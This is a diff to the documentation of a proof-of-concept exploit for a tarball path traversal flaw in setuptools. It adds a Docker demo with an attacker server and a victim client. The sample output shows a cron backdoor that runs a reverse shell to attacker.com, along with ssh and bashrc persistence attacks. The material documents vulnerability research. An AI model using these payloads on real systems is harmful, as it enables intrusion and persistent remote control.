@@ -383,15 +383,65 @@ def tarball(url, target_dir=None):
 ```
 tarball_vuln/
 ├── TARBALL.md                   # This document
-├── build_malicious_tarball.py   # Script to create malicious tarballs
-├── exploit_test.py              # Script to trigger and verify vulnerability
+├── docker-compose.yml           # Two-container attack demo
+├── Dockerfile.server            # Attacker's malicious tarball server
+├── Dockerfile.client            # Victim with vulnerable setuptools
+├── tarball_server.py            # Server that builds malicious tarballs on-demand
+├── tarball_client.py            # Client that triggers the vulnerability
+├── build_malicious_tarball.py   # Standalone script to create tarballs
+├── exploit_test.py              # Local exploit test (no Docker needed)
 ├── malicious_absolute.tar.gz    # Pre-built PoC (absolute path attack)
 └── malicious_traversal.tar.gz   # Pre-built PoC (path traversal attack)
 ```
 
 ---
 
-## Running the PoC
+## Running the Docker Demo
+
+```bash
+cd tarball_vuln/
+
+# Build and run both containers
+docker compose up --build
+```
+
+### Expected Output
+
+```
+============================================================
+EXECUTING ATTACK: CRON
+============================================================
+
+[VICTIM] Fetching tarball from: http://server:8080/package.tar.gz
+[VICTIM] Expected extraction to: /tmp/safe_directory/
+
+[EXPLOITED] File written to: /tmp/demo/etc/cron.d/backdoor
+
+[FILE CONTENTS]
+----------------------------------------
+# Malicious cron job - reverse shell every minute
+* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+----------------------------------------
+
+============================================================
+ATTACK SUMMARY
+============================================================
+  [EXPLOITED] cron
+  [EXPLOITED] ssh
+  [EXPLOITED] bashrc
+```
+
+### Server Web Interface
+
+The malicious server provides a web interface at http://localhost:8080/ showing:
+- Active attack scenario (cron, ssh, or bashrc)
+- Target path being exploited
+- Download link for the malicious tarball
+- Attack explanation
+
+---
+
+## Running the Local PoC (No Docker)
 
 ```bash
 # Clean up any previous test
